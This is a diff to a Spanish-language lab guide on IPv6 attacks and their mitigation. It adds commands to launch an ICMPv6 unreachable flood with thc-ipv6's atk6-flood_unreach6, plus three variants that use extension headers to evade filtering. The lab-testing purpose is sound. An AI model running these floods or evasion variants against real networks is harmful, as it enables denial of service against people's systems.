@@ -31,4 +31,11 @@ Neighbor Solitication requests.*  From https://www.kali.org/tools/thc-ipv6/
 * Desde **arubaaccess** verificar la mitigación del ataque ejecutando: `show nd-snooping statistics`
 ### **DoS mediante ICMPv6 Flooding** 
 
->***atk6-flood_unreachable:** Flood the target with ICMPv6 unreachable packets.*    
+>***atk6-flood_unreachable:** Flood the target with ICMPv6 unreachable packets.*
+* Desde **PC3**
+  *  Lanzar el ataque ejecutando: `atk6-flood_unreach6 eth1`
+  * Alternativas de evasión a filtrado usando campos de extensión: 
+  * Next Header field value 44 (Fragment) `atk6-flood_unreach6 -F eth1`
+  * Next Header field value 60 (Destination Options) `atk6-flood_unreach6 -D eth1`
+  * Next Header field value 0 (Hop-by-Hop Options) `atk6-flood_unreach6 -H eth1`
+    
